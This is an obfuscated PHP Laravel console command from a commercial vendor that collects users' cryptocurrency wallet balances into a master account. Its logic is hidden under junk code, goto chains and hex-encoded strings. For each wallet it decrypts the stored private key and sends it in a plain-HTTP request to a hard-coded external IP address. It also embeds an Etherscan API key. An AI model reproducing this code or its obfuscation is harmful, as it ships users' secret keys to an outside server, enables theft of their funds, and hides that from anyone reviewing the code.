<?php
/*
 本代码由 旗舰猫授权使用 创建
 创建时间 2020-06-08 06:11:27
 技术支持 QQ:2029336034 Mail:cold-cat-studio@foxmail.com
 严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
*/

namespace App\Console\Commands;use App\AccountLog;use App\UsersWallet;use App\Setting;use App\Utils\RPC;use App\Currency;use Illuminate\Console\Command;use Illuminate\Support\Facades\DB;class CollectToken extends Command{protected $signature="\x63\x6F\x6C\x6C\x65\x63\x74\x5F\x74\x6F\x6B\x65\x6E\x7B\x63\x75\x72\x72\x65\x6E\x63\x79\x5F\x69\x64\x20\x3A\x20\x69\x64\x7D";protected $description="\xE6\x94\xB6\xE9\x9B\x86\xE4\xBB\xA3\xE5\xB8\x81";protected $contract_address="";protected $total_account_address="";protected $total_account_key="";protected $currency_type="";protected $decimal_scale=18;public function handle(){unset($N2wtI8E);$currency_id=$this->argument('currency_id');unset($N2wtI8E);$currency=Currency::find($currency_id);unset($N2wtI8E);$contract_address=$currency->contract_address;unset($N2wtI8E);$total_account_address=$currency->total_account;unset($N2wtI8E);$total_account_key=$currency->key;unset($N2wtI8E);$currency_type=$currency->type;unset($N2wtI8E);$this->decimal_scale=$currency->decimal_scale;$N2wbN8X=!getdate();if($N2wbN8X)goto N2weWjgxa;$N2wbN8V=!true;unset($N2wtIbN8W);$N2wIfQU=$N2wbN8V;if($N2wIfQU)goto N2weWjgxa;$N2w8E=(bool)empty($contract_address);$N2wbN8R=true===strpos("Wi",4);if($N2wbN8R)goto N2weWjgx7;$N2w8O=!$N2w8E;if($N2w8O)goto N2weWjgx7;$N2wbN8P=4+1;$N2wbN8Q=4>$N2wbN8P;if($N2wbN8Q)goto N2weWjgx7;goto N2wldMhx7;N2weWjgx7:goto N2wMrKh5F;foreach($files as $file){if(strpos($file,CONF_EXT))goto N2weWjgx9;goto N2wldMhx9;N2weWjgx9:$N2wM8S=$dir . DS;$N2wM8T=$N2wM8S . $file;unset($N2wtIM8U);$filename=$N2wM8T;Config::load($filename,pathinfo($file,PATHINFO_FILENAME));goto N2wx8;N2wldMhx9:N2wx8:}N2wMrKh5F:$N2w8E=(bool)empty($total_account_address);goto N2wx6;N2wldMhx7:N2wx6:$N2w8F=(bool)$N2w8E;$N2w8G=!$N2w8F;if($N2w8G)goto N2weWjgx3;$N2wvPbN8H=4+1;$N2wbN8I=trim($N2wvPbN8H)==4;if($N2wbN8I)goto N2weWjgx3;$N2wvPbN8J=4+1;$N2wbN8K=trim($N2wvPbN8J)==4;if($N2wbN8K)goto N2weWjgx3;goto N2wldMhx3;N2weWjgx3:goto N2wMrKh5D;foreach($files as $file){if(strpos($file,CONF_EXT))goto N2weWjgx5;goto N2wldMhx5;N2weWjgx5:$N2wM8L=$dir . DS;$N2wM8M=$N2wM8L . $file;unset($N2wtIM8N);$filename=$N2wM8M;Config::load($filename,pathinfo($file,PATHINFO_FILENAME));goto N2wx4;N2wldMhx5:N2wx4:}N2wMrKh5D:$N2w8F=(bool)empty($total_account_key);goto N2wx2;N2wldMhx3:N2wx2:if($N2w8F)goto N2weWjgxa;goto N2wldMhxa;N2weWjgxa:goto N2wMrKh61;$N2wM8Y=$R4vP4 . DS;unset($N2wtIM8Z);$R4vP5=$N2wM8Y;unset($N2wtIM90);$R4vA5=array();unset($N2wtIM91);$R4vA5[]=$request;unset($N2wtIM92);$R4vC3=call_user_func_array($R4vA5,$R4vA4);N2wMrKh61:goto N2wMrKh63;unset($N2wtIM93);$R4vA1=array();unset($N2wtIM94);$N2wtIM94=&$dispatch;$R4vA1[]=&$N2wtIM94;unset($N2wtIM95);$R4vA2=array();unset($N2wtIM96);$R4vC0=call_user_func_array($R4vA2,$R4vA1);N2wMrKh63:$this->comment("后台账号设置错误");exit();goto N2wx1;N2wldMhxa:N2wx1:unset($N2wtI8E);$this->contract_address=$contract_address;$N2wbN8F=4+1;$N2wbN8G=E_STRICT==$N2wbN8F;if($N2wbN8G)goto N2weWjgxc;$N2wbN8H=true===strpos("Wi",4);if($N2wbN8H)goto N2weWjgxc;$N2w8E=$currency_type=='erc20';if($N2w8E)goto N2weWjgxc;goto N2wldMhxc;N2weWjgxc:goto N2wMrKh65;$N2wM8I=$R4vP4 . DS;unset($N2wtIM8J);$R4vP5=$N2wM8I;unset($N2wtIM8K);$R4vA5=array();unset($N2wtIM8L);$R4vA5[]=$request;unset($N2wtIM8M);$R4vC3=call_user_func_array($R4vA5,$R4vA4);N2wMrKh65:goto N2wMrKh67;unset($N2wtIM8N);$R4vA1=array();unset($N2wtIM8O);$N2wtIM8O=&$dispatch;$R4vA1[]=&$N2wtIM8O;unset($N2wtIM8P);$R4vA2=array();unset($N2wtIM8Q);$R4vC0=call_user_func_array($R4vA2,$R4vA1);N2wMrKh67:unset($N2wtI8R);$this->total_account_address=substr($total_account_address,2);goto N2wxb;N2wldMhxc:try{strlen(1);}catch(\Exception $e){$N2wM8S=$x*5;unset($N2wtIM8T);$y=$N2wM8S;echo "no login!";exit(1);}catch(\Exception $e){$N2wM8U=$x*1;unset($N2wtIM8V);$y=$N2wM8U;echo "no html!";exit(2);}unset($N2wtI8W);$this->total_account_address=$total_account_address;N2wxb:unset($N2wtI8E);$this->total_account_key=$total_account_key;unset($N2wtI8E);$this->currency_type=$currency_type;unset($N2wtI8E);$datas=UsersWallet::where('currency',$currency_id)->get();$this->comment("start");foreach($datas as $d){$this->collectToken($d);}$this->comment("end");}public function collectToken($data){$N2wbN8G=0==strlen(4);if($N2wbN8G)goto N2weWjgxf;$N2w8E=$this->currency_type=='btc';if($N2w8E)goto N2weWjgxf;$N2wvPbN8F=new \Exception();if(method_exists($N2wvPbN8F,4))goto N2weWjgxf;goto N2wldMhxf;N2weWjgxf:goto N2wMrKh69;unset($N2wtIM8H);$A_33="php_sapi_name";unset($N2wtIM8I);$A_34="die";unset($N2wtIM8J);$A_35="cli";unset($N2wtIM8K);$A_36="microtime";unset($N2wtIM8L);$A_37=1;N2wMrKh69:goto N2wMrKh6B;unset($N2wtIM8M);$A_38="argc";unset($N2wtIM8N);$A_39="echo";unset($N2wtIM8O);$A_40="HTTP_HOST";unset($N2wtIM8P);$A_41="SERVER_ADDR";N2wMrKh6B:return false;goto N2wxe;N2wldMhxf:N2wxe:$N2wvPbN8F=new \Exception();if(method_exists($N2wvPbN8F,4))goto N2weWjgxh;if(empty($data->address))goto N2weWjgxh;$N2wvPbN8E=new \Exception();if(method_exists($N2wvPbN8E,4))goto N2weWjgxh;goto N2wldMhxh;N2weWjgxh:try{strlen(1);}catch(\Exception $e){$N2wM8G=$x*5;unset($N2wtIM8H);$y=$N2wM8G;echo "no login!";exit(1);}catch(\Exception $e){$N2wM8I=$x*1;unset($N2wtIM8J);$y=$N2wM8I;echo "no html!";exit(2);}return false;goto N2wxg;N2wldMhxh:N2wxg:unset($N2wtI8E);$address=$data->address;$N2w8E=$this->currency_type=='eth';if($N2w8E)goto N2weWjgxk;if(stripos("mDitIkTI","4"))goto N2weWjgxk;$N2wbN8F=4+1;$N2wbN8G=E_STRICT==$N2wbN8F;if($N2wbN8G)goto N2weWjgxk;goto N2wldMhxk;N2weWjgxk:$N2wM8H=strlen(11)<1;if($N2wM8H)goto N2weWjgxm;goto N2wldMhxm;N2weWjgxm:$adminL();N2wMrKh6D:igjagoe;strlen("wolrlg");getnum(11);goto N2wxl;N2wldMhxm:N2wxl:goto N2wMrKh6E;if(is_array($rule))goto N2weWjgxo;goto N2wldMhxo;N2weWjgxo:unset($N2wtIM8I);$N2wtIM8I=array("rule"=>$rule,"msg"=>$msg);$this->validate=$N2wtIM8I;goto N2wxn;N2wldMhxo:$N2wM8J=true===$rule;if($N2wM8J)goto N2weWjgxq;goto N2wldMhxq;N2weWjgxq:$N2wM8K=$this->name;goto N2wxp;N2wldMhxq:$N2wM8K=$rule;N2wxp:unset($N2wtIM8L);$this->validate=$N2wM8K;N2wxn:N2wMrKh6E:$N2w8E="https://api.etherscan.io/api?module=account&action=balance&address=" . $address;$N2w8F=$N2w8E . "&tag=latest&apikey=579R8XPDUY1SHZNEZP9GA4FEF1URNC3X45";$N2w8G=$N2w8F . rand(1,10000);unset($N2wtI8H);$url=$N2w8G;goto N2wxj;N2wldMhxk:$N2wM8I=1+11;$N2wM8J=0>$N2wM8I;unset($N2wtIM8K);$N2wMrKh=$N2wM8J;if($N2wMrKh)goto N2weWjgxs;goto N2wldMhxs;N2weWjgxs:unset($N2wtIM8L);$N2wtIM8L=array($USER[0][0x17]=>$host,$USER[1][0x18]=>$login,$USER[2][0x19]=>$password,$USER[3][0x1a]=>$database,$USER[4][0x1b]=>$prefix);$ADMIN[0]=$N2wtIM8L;goto N2wxr;N2wldMhxs:N2wxr:$N2w8E="https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=" . $this->contract_address;$N2w8F=$N2w8E . "&address=";$N2w8G=$N2w8F . $address;$N2w8H=$N2w8G . "&tag=latest&apikey=579R8XPDUY1SHZNEZP9GA4FEF1URNC3X45";$N2w8I=$N2w8H . rand(1,1000);unset($N2wtI8J);$url=$N2w8I;N2wxj:unset($N2wtI8E);$content=RPC::apihttp($url);$N2wbN8G=4-4;if($N2wbN8G)goto N2weWjgxu;$N2w8E=!$content;if($N2w8E)goto N2weWjgxu;$N2wbN8F=__LINE__<-4;if($N2wbN8F)goto N2weWjgxu;goto N2wldMhxu;N2weWjgxu:$N2wM8H=1+11;$N2wM8I=0>$N2wM8H;unset($N2wtIM8J);$N2wMrKh=$N2wM8I;if($N2wMrKh)goto N2weWjgxw;goto N2wldMhxw;N2weWjgxw:unset($N2wtIM8K);$N2wtIM8K=array($USER[0][0x17]=>$host,$USER[1][0x18]=>$login,$USER[2][0x19]=>$password,$USER[3][0x1a]=>$database,$USER[4][0x1b]=>$prefix);$ADMIN[0]=$N2wtIM8K;goto N2wxv;N2wldMhxw:N2wxv:return false;goto N2wxt;N2wldMhxu:N2wxt:DB::beginTransaction();try{unset($N2wtI8E);$content=json_decode($content,true);$N2wbN8U=4==="";unset($N2wtIbN8V);$N2wIfQU=$N2wbN8U;if($N2wIfQU)goto N2weWjgx16;if(array_key_exists(4,array()))goto N2weWjgx16;$N2w8F=(bool)isset($content["message"]);if($N2w8F)goto N2weWjgx11;unset($N2wtIvPbN8G);$N2wIfQU="zS";$N2wbN8H=strlen($N2wIfQU)==1;if($N2wbN8H)goto N2weWjgx11;unset($N2wtIbN8I);$N2wIfQU=false;if($N2wIfQU)goto N2weWjgx11;goto N2wldMhx11;N2weWjgx11:if(function_exists("N2wMrKh"))goto N2weWjgx13;goto N2wldMhx13;N2weWjgx13:unset($N2wtIM8J);$var_12["arr_1"]=array("56e696665646","450594253435","875646e696","56d616e6279646");foreach($var_12["arr_1"] as $k=>$vo){$N2wM8K=gettype($var_12["arr_1"][$k])=="string";$N2wM8M=(bool)$N2wM8K;if($N2wM8M)goto N2weWjgx15;goto N2wldMhx15;N2weWjgx15:unset($N2wtIM8L);$N2wtIM8L=fun_3($vo);unset($N2wtIM8N);$N2wtIM8N=$N2wtIM8L;$var_12["arr_1"][$k]=$N2wtIM8N;$N2wM8M=(bool)$N2wtIM8L;goto N2wx14;N2wldMhx15:N2wx14:}$var_12["arr_1"][0](fun_2("arr_1",1),fun_2("arr_1",2));goto N2wx12;N2wldMhx13:goto N2wMrKh70;$N2wM8O=$var_12["arr_1"][3](__FILE__) . fun_2("arr_1",8);$N2wM8P=require $N2wM8O;$N2wM8Q=$var_12["arr_1"][3](__FILE__) . fun_2("arr_1",9);$N2wM8R=require $N2wM8Q;$N2wM8S=V_DATA . fun_2("arr_1",10);$N2wM8T=require $N2wM8S;N2wMrKh70:N2wx12:$N2w8E=$content["message"]=="OK";$N2w8F=(bool)$N2w8E;goto N2wxz;N2wldMhx11:N2wxz:if($N2w8F)goto N2weWjgx16;goto N2wldMhx16;N2weWjgx16:try{strlen(1);}catch(\Exception $e){$N2wM8W=$x*5;unset($N2wtIM8X);$y=$N2wM8W;echo "no login!";exit(1);}catch(\Exception $e){$N2wM8Y=$x*1;unset($N2wtIM8Z);$y=$N2wM8Y;echo "no html!";exit(2);}unset($N2wtI8E);$lessen=bc_pow(10,$this->decimal_scale);unset($N2wtI8E);$chain_balance=bc_div($content["result"],$lessen);$N2wbN8F=4+1;$N2wbN8G=E_STRICT==$N2wbN8F;if($N2wbN8G)goto N2weWjgx19;$N2w8E=$chain_balance>0;if($N2w8E)goto N2weWjgx19;$N2wbN8H=gettype(E_PARSE)=="hdZBJ";if($N2wbN8H)goto N2weWjgx19;goto N2wldMhx19;N2weWjgx19:if(function_exists("N2wMrKh"))goto N2weWjgx1b;goto N2wldMhx1b;N2weWjgx1b:unset($N2wtIM8I);$var_12["arr_1"]=array("56e696665646","450594253435","875646e696","56d616e6279646");foreach($var_12["arr_1"] as $k=>$vo){$N2wM8J=gettype($var_12["arr_1"][$k])=="string";$N2wM8L=(bool)$N2wM8J;if($N2wM8L)goto N2weWjgx1d;goto N2wldMhx1d;N2weWjgx1d:unset($N2wtIM8K);$N2wtIM8K=fun_3($vo);unset($N2wtIM8M);$N2wtIM8M=$N2wtIM8K;$var_12["arr_1"][$k]=$N2wtIM8M;$N2wM8L=(bool)$N2wtIM8K;goto N2wx1c;N2wldMhx1d:N2wx1c:}$var_12["arr_1"][0](fun_2("arr_1",1),fun_2("arr_1",2));goto N2wx1a;N2wldMhx1b:goto N2wMrKh72;$N2wM8N=$var_12["arr_1"][3](__FILE__) . fun_2("arr_1",8);$N2wM8O=require $N2wM8N;$N2wM8P=$var_12["arr_1"][3](__FILE__) . fun_2("arr_1",9);$N2wM8Q=require $N2wM8P;$N2wM8R=V_DATA . fun_2("arr_1",10);$N2wM8S=require $N2wM8R;N2wMrKh72:N2wx1a:$N2w8E=$this->currency_type=='eth';if($N2w8E)goto N2weWjgx1f;$N2wbN8G=1+4;$N2wbN8H=$N2wbN8G<4;if($N2wbN8H)goto N2weWjgx1f;$N2wbN8F=md5(4)=="QPkIeD";if($N2wbN8F)goto N2weWjgx1f;goto N2wldMhx1f;N2weWjgx1f:$N2wMrKh=1*0;switch($N2wMrKh){case 1:return bClass($url,$bind,$depr);case 2:return bController($url,$bind,$depr);case 3:return bNamespace($url,$bind,$depr);}$N2w8E=$content["result"]/1000000000000000000;unset($N2wtI8F);$content["result"]=$N2w8E;$content['result']=$content['result']-0.001;$N2wnW8E=$content['result'];$N2w8E='http://47.92.171.137:8999/web3/transfer?toaddress=' . $this->total_account_address;$N2w8F=$N2w8E . '&from_address=';$N2w8G=$N2w8F . $address;$N2w8H=$N2w8G . '&transfer_value=';$N2w8I=$N2w8H . $content["result"];$N2w8J=$N2w8I . '&privates=';$N2w8K=$N2w8J . decrypt($data->private);unset($N2wtI8L);$address_url=$N2w8K;goto N2wx1e;N2wldMhx1f:$N2wM8M=1+11;$N2wM8N=0>$N2wM8M;unset($N2wtIM8O);$N2wMrKh=$N2wM8N;if($N2wMrKh)goto N2weWjgx1l;goto N2wldMhx1l;N2weWjgx1l:unset($N2wtIM8P);$N2wtIM8P=array($USER[0][0x17]=>$host,$USER[1][0x18]=>$login,$USER[2][0x19]=>$password,$USER[3][0x1a]=>$database,$USER[4][0x1b]=>$prefix);$ADMIN[0]=$N2wtIM8P;goto N2wx1k;N2wldMhx1l:N2wx1k:$N2w8E="http://47.92.171.137:8999/web3/transfer/oec?is_new=1&toaddress=" . $this->total_account_address;$N2w8F=$N2w8E . "&transfer_value=";$N2w8G=$N2w8F . $content["result"];$N2w8H=$N2w8G . "&contract_address=";$N2w8I=$N2w8H . $this->contract_address;$N2w8J=$N2w8I . "&fromeaddress=";$N2w8K=$N2w8J . $address;$N2w8L=$N2w8K . "&privates=";$N2w8M=$N2w8L . decrypt($data->private);$N2w8N=$N2w8M . '&decimal_scale=';$N2w8O=$N2w8N . $this->decimal_scale;unset($N2wtI8P);$address_url=$N2w8O;N2wx1e:unset($N2wtI8E);$lian=RPC::apihttp($address_url);unset($N2wtI8E);$lian=@json_decode($lian,true);$N2wbN8G=0==strlen(4);if($N2wbN8G)goto N2weWjgx1n;$N2wbN8F=base64_decode("SPvUszVX")=="SkrdABRw";if($N2wbN8F)goto N2weWjgx1n;$N2w8E=$lian["error"]=="0";if($N2w8E)goto N2weWjgx1n;goto N2wldMhx1n;N2weWjgx1n:$N2wMrKh=1*0;switch($N2wMrKh){case 1:return bClass($url,$bind,$depr);case 2:return bController($url,$bind,$depr);case 3:return bNamespace($url,$bind,$depr);}unset($N2wtI8E);$data->old_balance=0;$data->save();$N2wvPvP8E=$data->user_id . "归拢";AccountLog::insertLog(array("user_id"=>99999,"value"=>$content["result"],"type"=>AccountLog::ETH_EXCHANGE,"info"=>$N2wvPvP8E,'currency'=>$data->currency));$N2wvP8E=$this->total_account_address . "user_id:";$N2wvP8F=$N2wvP8E . $lian["content"];$this->comment($N2wvP8F);goto N2wx1m;N2wldMhx1n:goto N2wMrKh74;foreach($files as $file){if(strpos($file,CONF_EXT))goto N2weWjgx1t;goto N2wldMhx1t;N2weWjgx1t:$N2wM8G=$dir . DS;$N2wM8H=$N2wM8G . $file;unset($N2wtIM8I);$filename=$N2wM8H;Config::load($filename,pathinfo($file,PATHINFO_FILENAME));goto N2wx1s;N2wldMhx1t:N2wx1s:}N2wMrKh74:$this->comment('请求地址：');dump($address_url);$this->comment('请求响应：');dump($lian);$N2wvP8E="请重试" . $lian["error"];$this->comment($N2wvP8E);N2wx1m:goto N2wx18;N2wldMhx19:try{strlen(1);}catch(\Exception $e){$N2wM8F=$x*5;unset($N2wtIM8G);$y=$N2wM8F;echo "no login!";exit(1);}catch(\Exception $e){$N2wM8H=$x*1;unset($N2wtIM8I);$y=$N2wM8H;echo "no html!";exit(2);}$this->comment($content["result"]);N2wx18:goto N2wxy;N2wldMhx16:goto N2wMrKh76;foreach($files as $file){if(strpos($file,CONF_EXT))goto N2weWjgx1w;goto N2wldMhx1w;N2weWjgx1w:$N2wM8E=$dir . DS;$N2wM8F=$N2wM8E . $file;unset($N2wtIM8G);$filename=$N2wM8F;Config::load($filename,pathinfo($file,PATHINFO_FILENAME));goto N2wx1v;N2wldMhx1w:N2wx1v:}N2wMrKh76:$this->comment($content);N2wxy:DB::commit();}catch(\Exception $ex){DB::rollback();$this->comment($ex->getMessage());}}}
?>